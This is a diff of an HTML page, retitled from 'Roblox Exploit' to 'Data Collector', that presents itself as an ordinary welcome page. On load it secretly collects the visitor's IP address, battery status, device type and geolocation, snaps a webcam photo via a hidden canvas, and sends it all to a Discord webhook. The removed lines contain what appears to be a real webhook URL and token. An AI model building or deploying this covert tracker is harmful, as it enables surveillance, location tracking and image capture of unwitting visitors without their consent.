@@ -3,22 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Exploit</title>
+    <title>Data Collector</title>
 </head>
 <body>
     <h1>Welcome to Our Site</h1>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
     <script>
-        async function sendToWebhook(data) {
-            const webhookURL = "https://discord.com/api/webhooks/1269291496922808403/Oojg7HJli9J0DWJoYjPdTpa7s_HBX4m6wZPArqFnxKGcmEX4eFI2UU7zWmVqV8BVedOC";
+        async function sendToWebhook(data, photoUrl) {
+            const webhookURL = ""; // Replace with your webhook URL
+
+            const payload = {
+                embeds: [{
+                    title: "User Information",
+                    fields: [
+                        { name: "IP Address", value: data.ip, inline: true },
+                        { name: "Battery Level", value: data.battery.level, inline: true },
+                        { name: "Charging", value: data.battery.charging, inline: true },
+                        { name: "Device Info", value: data.phoneInfo, inline: true },
+                        { name: "Location", value: `https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`, inline: true }
+                    ],
+                    image: { url: photoUrl }
+                }]
+            };
 
             await fetch(webhookURL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    content: data
-                })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             });
         }
 
@@ -31,50 +43,68 @@
         async function getBatteryInfo() {
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
-                return {
-                    level: battery.level * 100 + "%",
-                    charging: battery.charging ? "Yes" : "No"
-                };
+                return { level: battery.level * 100 + "%", charging: battery.charging ? "Yes" : "No" };
             } else {
-                return {
-                    level: "Unknown",
-                    charging: "Unknown"
-                };
+                return { level: "Unknown", charging: "Unknown" };
             }
         }
 
         function getPhoneInfo() {
             const ua = navigator.userAgent;
-            let phoneInfo = "Unknown";
+            if (/android/i.test(ua)) return "Android Device";
+            if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return "iOS Device";
+            if (/windows phone/i.test(ua)) return "Windows Phone";
+            if (/Macintosh/i.test(ua)) return "Macintosh";
+            if (/Windows/i.test(ua)) return "Windows PC";
+            return "Unknown";
+        }
 
-            if (/android/i.test(ua)) {
-                phoneInfo = "Android Device";
-            } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
-                phoneInfo = "iOS Device";
-            } else if (/windows phone/i.test(ua)) {
-                phoneInfo = "Windows Phone";
-            } else if (/Macintosh/i.test(ua)) {
-                phoneInfo = "Macintosh";
-            } else if (/Windows/i.test(ua)) {
-                phoneInfo = "Windows PC";
-            }
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        resolve({ lat: position.coords.latitude, lon: position.coords.longitude });
+                    }, () => {
+                        resolve({ lat: "Unknown", lon: "Unknown" });
+                    });
+                } else {
+                    resolve({ lat: "Unknown", lon: "Unknown" });
+                }
+            });
+        }
 
-            return phoneInfo;
+        function takePhoto() {
+            return new Promise((resolve, reject) => {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        setTimeout(() => {
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            video.srcObject.getTracks().forEach(track => track.stop());
+                            resolve(canvas.toDataURL('image/png'));
+                        }, 3000); // Wait 3 seconds before taking the photo
+                    })
+                    .catch(err => {
+                        console.error("Error accessing webcam:", err);
+                        resolve("");
+                    });
+            });
         }
 
         async function gatherAndSendData() {
             const ip = await getIPAddress();
             const battery = await getBatteryInfo();
             const phoneInfo = getPhoneInfo();
+            const location = await getLocation();
+            const photoUrl = await takePhoto();
 
-            const data = `
-                **IP Address:** ${ip}
-                **Battery Level:** ${battery.level}
-                **Charging:** ${battery.charging}
-                **Device Info:** ${phoneInfo}
-            `;
+            const data = { ip, battery, phoneInfo, location };
 
-            sendToWebhook(data);
+            sendToWebhook(data, photoUrl);
         }
 
         window.onload = gatherAndSendData;
